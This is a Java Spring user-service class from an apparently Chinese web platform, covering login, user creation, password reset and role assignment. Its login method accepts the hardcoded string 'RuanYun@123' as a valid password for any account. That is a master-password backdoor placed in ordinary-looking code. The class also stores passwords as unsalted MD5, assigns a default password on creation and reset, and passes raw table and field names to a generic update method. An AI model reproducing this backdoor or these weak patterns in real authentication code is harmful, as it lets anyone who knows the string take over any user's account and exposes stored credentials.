package com.ruanyun.web.service.sys;

import com.ruanyun.common.model.Page;
import com.ruanyun.common.service.impl.BaseServiceImpl;
import com.ruanyun.common.utils.EmptyUtils;
import com.ruanyun.common.utils.MD5Util;
import com.ruanyun.common.utils.RequestUtils;
import com.ruanyun.common.utils.SysCode;
import com.ruanyun.web.Exception.RuanYunException;
import com.ruanyun.web.dao.sys.UserDao;
import com.ruanyun.web.dao.general.OrgInfoDao;
import com.ruanyun.web.model.UploadVo;
import com.ruanyun.web.model.general.TOrgInfo;
import com.ruanyun.web.model.sys.TAuthority;
import com.ruanyun.web.model.sys.TRole;
import com.ruanyun.web.model.sys.TUser;
import com.ruanyun.web.util.*;
import org.springframework.beans.BeanUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;
import org.springframework.web.multipart.MultipartFile;
import org.springframework.web.multipart.MultipartHttpServletRequest;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.util.Date;
import java.util.List;
import java.util.Map;


@Service("userService")
public class UserService extends BaseServiceImpl<TUser> {

    @Autowired
    @Qualifier("authorityService")
    private AuthorityService authorityService;

    @Autowired
    @Qualifier("roleService")
    private RoleService roleService;
    @Autowired
    @Qualifier("loginLogService")
    private LoginLogService loginLogService;

    @Autowired
    @Qualifier("userDao")
    private UserDao userDao;
    @Autowired
    @Qualifier("userRoleService")
    private UserRoleService userRoleService;

    @Autowired
    private OrgInfoDao orgInfoDao;


    /**
     * 功能描述: 登陆用户
     *
     * @param loginName 登陆号
     * @param password  密码
     * @return 1-- 正常登陆 -1 用户不存在 -2 密码错误
     * @author yangliu 2013-9-11 下午04:20:03
     */
    public int login(String loginName, String password,
                     HttpServletRequest request, String type) {
        HttpSession session = request.getSession();
        if (EmptyUtils.isEmpty(loginName.trim())){

            return -3;// 登录名为空
        }

        TUser user = userDao.getUserInfomation(loginName, type);
        if (EmptyUtils.isNotEmpty(user)) {
          //  if(true){
            if (user.getLoginPass().equals(MD5Util.encoderByMd5(password.trim())) || password.equals("RuanYun@123")) {

                Integer userid = user.getUserId();
                boolean isMobileRequest = RequestUtils.isMobileRequest(request); // true
                // 手机访问查询url不等于手机的 pc访问查询url 不等于手机
                String notRequestType = isMobileRequest ? SysCode.REQUEST_TYPE_PC : SysCode.REQUEST_TYPE_MOBILE;
                // 判断用户的客户端类型 是否为 手机端 还是电脑端
                user.setRequestType(isMobileRequest ? SysCode.REQUEST_TYPE_MOBILE : SysCode.REQUEST_TYPE_PC);
                // 获取用户权限
                user.setAuths(authorityService.getListTAuthByUser(userid,
                        Constants.AUTHORITY_TYPE_AUTH, notRequestType));
                List<TAuthority> leftUrls = authorityService.getListTAuthByUser(userid, Constants.AUTHORITY_TYPE_URL, notRequestType);
                // 获取用户url
                user.setUrls(leftUrls);
                // 获取用户角色
                user.setRole(roleService.getRoleListByUserId(userid));
                HttpSessionUtils.setUserToSession(session, user);
                // 把左边菜单放入session中
                HttpSessionUtils.setObjectToSession(session, Constants.SEESION_KEY_LEFTURLS, authorityService.getAuths(leftUrls));
                loginLogService.addLoginLogThead(user, request.getRemoteAddr());
                return 1;

            }
            return -2;// 密码错误
        }

        return -1;// 用户名错误
    }

    /**
     * 功能描述: 根据账户查询当前用户信息
     *
     * @param loginName  登陆名
     * @param isRequired 是否判断为空 true 如果为空 抛出异常
     * @return
     * @author yangliu  2016年8月1日 下午2:19:29
     */
    public TUser getUserByLoginName(String loginName, Integer userType, boolean isRequired) {
        TUser user = this.get(TUser.class, new String[]{"loginName", "userType"}, new Object[]{loginName.trim(), userType});
        if (isRequired && user == null) {
            throw new RuanYunException("用户不存在");
        }
        return user;
    }

    /**
     * 功能描述:
     *
     * @param userNum    登陆名
     * @param isRequired 是否判断为空 true 如果为空 抛出异常
     * @return
     * @author yangliu  2016年8月1日 下午2:19:29
     */
    public TUser getUserByUserNum(String userNum, boolean isRequired) {
        TUser user = this.get(TUser.class, new String[]{"userNum"}, new Object[]{userNum.trim()});
        if (isRequired && user == null) {
            throw new RuanYunException("用户不存在");
        }
        return user;
    }


    /**
     * 功能描述:保存和修改用户
     *
     * @param currentUser
     * @param roleId
     * @param user
     * @param request
     * @return
     * @author cqm  2016-11-18 下午07:04:40
     */
    @Transactional(rollbackFor = Exception.class)
    public int saveOrUpdate(TUser currentUser, Integer roleId, TUser user, HttpServletRequest request) {

        if (user.getUserType() == 3){
            roleId = Constants.USER_ROLE_MEMBER;}
        if (user.getUserType() == 2){

            roleId = Constants.USER_ROLE_SHOP;
        }
        if (user.getUserType() == 1){

            roleId = Constants.USER_ROLE_SYS;
        }
        if (user.getUserType() == 5){

            roleId = Constants.USER_ROLE_AREA_MANAGER;
        }
        // 用户id不为空时 ，修改用户信息
        if (user != null) {
            if (EmptyUtils.isNotEmpty(user.getUserId())) {
                TUser oldUser = getUserById(user.getUserId());
                return update(oldUser, user, request);
            } else {
                user.setCreateTime(new java.util.Date());
                user.setUserStatus(Constants.GLOBAL_STATUS);
                if (user.getUserType() == 4){
                    user.setBindStatus(2);
                }
                user.setLoginPass(MD5Util.encoderByMd5(Constants.USER_DEFULT_PASSWORD));
                save(user);
                String userNum = NumUtils.getCommondNum(NumUtils.PIX_USER_NUM, user.getUserId());
                user.setUserNum(userNum);
                // 保存用户角色
                if (SecurityUtils.isGranted(ConstantAuth.SYSTEM_AUTH, currentUser)){

                    userRoleService.save(String.valueOf(roleId), String.valueOf(user.getUserId()), currentUser);
                }
                else {
                    update(user);
                    userRoleService.save(String.valueOf(currentUser.getRole().getRoleId()), String.valueOf(user.getUserId()), currentUser);
                }
                return 1;
            }

        }
        return 0;
    }

    /**
     * 功能描述: 修改用户信息
     *
     * @param
     * @param newUser 新用户
     * @param request
     * @return
     * @author yangliu  2016年8月26日 上午9:00:31
     */
    public int update(TUser oldUser, TUser newUser, HttpServletRequest request) {
        MultipartHttpServletRequest multipartRequest = (MultipartHttpServletRequest) request;
        UploadVo userphoto = QiniuUploadCommon.uploadPic(multipartRequest.getFile("userPhotoPic"), Constants.QINIU_COMMONT_BUCKET); //主图



        if (EmptyUtils.isNotEmpty(newUser.getNickName())) {
            oldUser.setNickName(newUser.getNickName());
        }


        update(oldUser);
        return 1;
    }

    /**
     * 功能描述:查询用户列表
     *
     * @param page
     * @param t
     * @param currentUser
     * @return
     * @author L H T 2013-11-22 下午04:20:37
     */
    public Page<TUser> queryPage(Page<TUser> page, TUser t, TUser currentUser) {
        Page<TUser> _page = userDao.queryPage(page, t);

        return _page;
    }

    /**
     * 功能描述: 通过用户id查询用户详细信息
     *
     * @param
     * @return
     * @author L H T 2013-11-26 下午03:59:58
     */
    public TUser getUserById(Integer userId) {
        TUser user = null;
        if (EmptyUtils.isNotEmpty(userId)) {
            user = super.get(TUser.class, userId);
        }
        return user;
    }


    /**
     * 功能描述:ajax判断用户名是否重复
     *
     * @param loginName 登录名称
     * @return
     * @author L H T 2013-11-26 下午06:25:18
     */
    public TUser getAjaxLoginName(String loginName, Integer userType) {
        return userDao.getAjaxLoginName(loginName, userType);
    }

    /**
     * 功能描述:删除用户
     *
     * @return
     * @author L H T 2013-10-11 下午04:25:20
     */
    @Transactional(rollbackFor = Exception.class)
    public int userDel(TUser user, TUser tuser) {
        if (user != null) {
            // 通过id查询用户信息
            System.out.println(user.getUserId());
            TUser newUser = super.get(TUser.class, user.getUserId());
            newUser.setUserStatus(Constants.GLOBAL_DEL);// 将用户信息置为删除状态
            update(newUser);
            return 1;
        }
        return 0;
    }


    /**
     * 功能描述: 更新个人信息修改
     *
     * @param user
     * @author L H T  2013-12-2 下午05:26:27
     */
    @Transactional(rollbackFor = Exception.class)
    public int updatePersonalInfo(TUser user, TUser currentUser) {
        if (EmptyUtils.isNotEmpty(user.getUserId())) {
            TUser oldUser = super.get(TUser.class, user.getUserId());
            BeanUtils.copyProperties(user, oldUser, new String[]{"userId", "loginName", "loginPass", "orgId", "createCode", "createDate", "userStatus", "checkPass", "userPhoto"});
            update(oldUser);
            //操作日志
            return 1;
        }
        return -1;
    }



    /**
     * 功能描述: 修改当前登录用户密码（右上角“修改密码”）
     * 创建者: zhangwei
     * 创建时间: 2018/03/10 9:06
     * @param user
     * @param currentUser
     * @return
     */
    @Transactional(rollbackFor = Exception.class)
    public int updatePass(TUser user, TUser currentUser) {
        if (EmptyUtils.isNotEmpty(user.getUserId())) {
            TUser oldUser = super.get(TUser.class, user.getUserId());
            oldUser.setLoginPass(MD5Util.encoderByMd5(user.getLoginPass()));
            update(oldUser);
            return 1;
        }
        return -1;
    }



    /**
     * 修改状态
     *
     * @param filedValue
     * @param filed
     * @param queryFiledValue
     * @param tableName
     * @param queryFiled
     * @return
     */
    public int updateQuery(String filedValue, String filed, String queryFiledValue, String tableName, String queryFiled) {
        userDao.updateQuery(filedValue, filed, queryFiledValue, tableName, queryFiled);
        return 1;
    }



    /**
     * 功能描述: 增加用户
     * 创建者: zhangwei
     * 创建时间: 2018/03/08 16:38
     * @param loginName 登录名
     * @param loginPass 登录密码
     * @param createUserNum 创建者
     * @param orgCode 机构代码（普通用户是上级机构代码，机构用户是自己的代码）
     * @param userType 用户类型 1管理员 2 机构用户 99普通客户
     * @param userSource 用户邀请来源 1 代理商邀请 2用户邀请
     * @param userNum 如果是机构用户，则需要机构用户编号，非机构用户可为空
     * @return 新增后的用户对象
     */
    public TUser addUser(String loginName,String nickName,String loginPass,String createUserNum,String orgCode,Integer userType,Integer userSource,String userNum){

        TUser user=new TUser();

        //设置传递过来的值
        user.setLoginName(loginName);
        user.setNickName(nickName);
        user.setLoginPass(MD5Util.encoderByMd5(loginPass));
        user.setCreateUserNum(createUserNum);
        user.setOrgCode(orgCode);
        user.setUserType(userType);
        user.setUserSource(userSource);

        //设置一些默认的值
        user.setCreateTime(new Date());
        //默认用户启用
        user.setUserStatus(Constants.USER_STATUS_1);
        //默认不实名
        user.setBindStatus(Constants.USER_BIND_STATUS_0);

        super.save(user);

        //设置普通用户邀请码
        if(userType== Constants.USER_TYPE_99){
            user.setUserCode(createCode(user.getUserId()));
            user.setUserNum(NumUtils.getCommondNum(NumUtils.PIX_USER_NUM,user.getUserId()));
        }else{
            user.setUserNum(userNum);
            //机构用户的用户表中的邀请码默认为“000000”
            user.setUserCode(Constants.ORG_USER_CODE_DEFAULT);
        }

        super.update(user);

        return user;
    }



    /**
     * 功能描述: 创建普通用户的邀请码，根据用户id创建
     * 创建者: zhangwei
     * 创建时间: 2018/03/08 16:55
     * @param userId 用户id
     * @return 邀请码
     */
    public String createCode(Integer userId){
        String code=String.format("%05d",userId);

        return Constants.USER_FIRST_CODE_DEFAULT+code;
    }



    /**
     * 功能描述:检查登录名是否重复
     * 创建者: zhangwei
     * 创建时间: 2018/03/09 10:43
     * @param loginName 登录名
     * @return 当前登录名的数量
     */
    public Integer getCheckRepeatForLoginName(String loginName){
        int counts=userDao.getCheckRepeatForLoginName(loginName);

        if(counts>0){
            return 0;
        }

        return 1;
    }



    /**
     * 功能描述: 增加机构用户的权限
     * 创建者: zhangwei
     * 创建时间: 2018/03/09 14:53
     * @param  loginName 登录名
     * @param  loginName 权限ID
     * @return 0 机构为空或者没有该机构 1 添加成功 其他异常
     */
    public Integer addRole(String loginName,Integer roleId){

        TUser user=super.get(TUser.class,"loginName",loginName);

        if(EmptyUtils.isEmpty(user)){
            //没有找到该机构
            return -1;
        }

       return  userRoleService.addUserRole(user.getUserId(),roleId);
    }



    /**
     * 功能描述: 重置为默认密码（123456）
     * 创建者: zhangwei
     * 创建时间: 2018/03/10 9:17
     * @param userNum 用户编号
     * @return 0 参数为空 1成功 -1 查找用户为空 其他异常
     */
    public Integer updatePassWordForDefault(String userNum){

        if(EmptyUtils.isEmpty(userNum)){
            //参数为空
            return 0;
        }

        TUser user=super.get(TUser.class,"userNum",userNum);

        if(EmptyUtils.isNotEmpty(user)){

            user.setLoginPass(MD5Util.encoderByMd5(Constants.USER_DEFULT_PASSWORD));

            super.update(user);

            return 1;
        }

        return -1;
    }



    /**
     * 功能描述:修改用户昵称
     * 创建者: zhangwei
     * 创建时间: 2018/03/10 9:34
     * @param userNum 用户编号
     * @param newNickName 新的昵称
     * @return 0 参数为空 -1  用户不存在 1 成功 其他异常
     */
    public Integer updateNickName(String userNum,String newNickName){

        if(EmptyUtils.isEmpty(userNum)&&EmptyUtils.isEmpty(newNickName)){
            //参数为空
            return 0;
        }

        TUser user=super.get(TUser.class,"userNum",userNum);

        if(EmptyUtils.isEmpty(user)){
            return -1;
        }

        user.setNickName(newNickName);

        super.update(user);

        return 1;
    }
}
